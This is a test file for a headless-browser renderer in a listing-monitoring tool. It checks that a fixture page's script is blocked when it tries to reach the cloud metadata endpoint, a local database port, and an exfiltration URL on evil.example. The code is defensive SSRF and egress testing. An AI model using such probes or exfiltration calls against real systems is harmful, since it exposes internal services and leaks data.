import { afterAll, beforeAll, describe, expect, it } from 'vitest'

import { createBrowserRenderer, type Renderer } from '@/lib/monitor/browser'
import { extractListing } from '@/lib/monitor/items'

/**
 * Browser tier exit gate: a real Chromium renders a JavaScript-built listing,
 * and the page's attempts to reach the metadata service, a local database
 * port, an off-site host and a WebSocket are all refused before they leave
 * the browser. Requests that pass every check are answered by fixtures, so
 * nothing in this test touches the network.
 */

const PAGE = `<!doctype html><html><head><title>Calls</title></head><body>
<main><ul id="calls"></ul></main>
<img src="https://fixture.example/banner.png">
<script>
  window.__probe = {}
  const attempt = (name, fn) => fn().then(() => { window.__probe[name] = 'reached' }, () => { window.__probe[name] = 'blocked' })
  attempt('metadata', () => fetch('http://169.254.169.254/latest/meta-data/'))
  attempt('localdb', () => fetch('http://127.0.0.1:5432/'))
  attempt('offsite', () => fetch('https://evil.example/exfil?d=' + document.title))
  try {
    const ws = new WebSocket('wss://fixture.example/socket')
    ws.onopen = () => { window.__probe.ws = 'open' }
    ws.onclose = () => { window.__probe.ws = window.__probe.ws || 'closed' }
  } catch (e) { window.__probe.ws = 'threw' }
  setTimeout(() => {
    const list = document.getElementById('calls')
    for (const [href, text] of [
      ['/calls/nest-2026', 'NEST call for proposals 2026'],
      ['/calls/wos-a', 'Women Scientists Scheme WOS-A'],
      ['/sites/default/files/guidelines.pdf', 'Guidelines (PDF)'],
    ]) {
      const li = document.createElement('li')
      const a = document.createElement('a')
      a.href = href
      a.textContent = text
      li.appendChild(a)
      list.appendChild(li)
    }
  }, 50)
</script>
</body></html>`

describe('browser tier', () => {
  const answered: string[] = []
  let renderer: Renderer

  beforeAll(async () => {
    renderer = await createBrowserRenderer({
      pacer: null,
      resolver: async (host) => {
        if (host === 'fixture.example') return ['93.184.216.34']
        if (host === 'evil.example') return ['93.184.216.99']
        throw new Error('ENOTFOUND')
      },
      fixtureResponder: (url) => {
        answered.push(url)
        if (url === 'https://fixture.example/calls') return { status: 200, contentType: 'text/html', body: PAGE }
        return null
      },
    })
  })

  afterAll(async () => {
    await renderer?.close()
  })

  it('renders a JavaScript-built listing and refuses every unsafe request', async () => {
    const result = await renderer.render('https://fixture.example/calls', {
      inScope: (host) => host === 'fixture.example',
      readinessSelector: '#calls a',
      minDelayMs: 0,
    })

    expect(result.ready).toBe(true)
    const items = extractListing(result.html, result.finalUrl, { selector: '#calls' }).items
    expect(items.map((item) => item.url)).toEqual([
      'https://fixture.example/calls/nest-2026',
      'https://fixture.example/calls/wos-a',
      'https://fixture.example/sites/default/files/guidelines.pdf',
    ])

    // Only the page itself was answered; the metadata service, the local
    // database port, the off-site host, the image and the socket never were.
    expect(answered).toEqual(['https://fixture.example/calls'])
    expect(result.blockedRequests).toBeGreaterThanOrEqual(5)
  })

  it('treats a page that never becomes ready as not ready rather than complete', async () => {
    const result = await renderer.render('https://fixture.example/calls', {
      inScope: (host) => host === 'fixture.example',
      readinessSelector: '#never-there',
      minDelayMs: 0,
    })
    expect(result.ready).toBe(false)
  })

  it('refuses to render a private target at all', async () => {
    await expect(
      renderer.render('http://169.254.169.254/', { inScope: () => true, minDelayMs: 0 })
    ).rejects.toMatchObject({ code: 'BLOCKED_ADDRESS' })
  })
})
